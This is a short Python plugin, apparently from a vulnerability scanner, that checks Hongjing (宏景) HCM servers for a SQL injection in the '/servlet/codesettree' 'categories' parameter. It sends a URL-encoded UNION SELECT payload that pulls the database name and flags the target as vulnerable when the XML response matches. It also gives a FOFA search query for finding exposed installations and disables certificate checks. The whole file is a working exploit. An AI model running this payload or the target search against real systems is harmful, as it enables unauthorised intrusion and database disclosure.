#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  'https://mp.weixin.qq.com/s/POPH36gYxyD_P2s0kql-Vg',

      'method'    :   'get',

      'bugname'   :   '宏景HCM categories SQL注入',

      'level'     :   'critical',

      'FOFA'      :   '"宏景软件 版权所有"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2cdb~5fname~28~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'xml version.*?TreeNode id=.*?text=.*?/TreeNode.*?',res.text,re.S):
      result = re.search(r'TreeNode id=".*?" text.*?xml.*?',res.text,re.S)
      # print(result.group())
      ret['huixian'] = result.group()
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret